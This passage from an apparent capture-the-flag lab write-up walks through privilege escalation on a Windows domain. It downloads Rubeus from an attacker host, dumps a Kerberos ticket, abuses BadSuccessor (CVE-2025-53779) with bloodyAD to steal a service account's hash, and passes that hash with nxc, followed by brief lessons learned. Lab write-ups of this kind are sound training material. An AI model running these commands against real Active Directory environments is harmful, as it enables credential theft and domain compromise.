3. Privilege Escalation

BadSuccessor (CVE-2025-53779) → svc_deploy

Dump a TGT for ryan.brooks with Rubeus, convert to ccache, then create a malicious dMSA:

# attacker
sudo apt install rubeus
cp /usr/share/windows-resources/rubeus/Rubeus.exe /tmp && cd /tmp && python3 -m http.server

# target
wget http://<attacker-ip>:8000/Rubeus.exe -OutFile Rubeus.exe
.\Rubeus.exe tgtdeleg /nowrap
# attacker — save base64 ticket
echo "<Base64-ticket>" | base64 -d > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan.ccache
export KRB5CCNAME=ryan.ccache

bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=ryan.ccache add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
# RC4 hash of svc_deploy from dMSA previous keys

VMBackups → Memory Hashdump → Domain Admin

nxc smb <target-ip> -d checkpoint.htb -u svc_deploy -H '<hash-key>' --shares

✅ Lessons Learned Restoring a deleted user with WRITE rights and password reuse unlocked a writable DevDrop share — a perfect drop for a malicious VSIX. From ryan.brooks, BadSuccessor (CVE-2025-53779) recovered svc_deploy’s RC4 hash, which could read VM memory backups. Volatility hashdump of a domain admin from a snapshot closed the chain. Treat deleted-object ACLs, extension drop shares, and dMSA permissions as high-value attack surface; encrypt or isolate backup memory images.
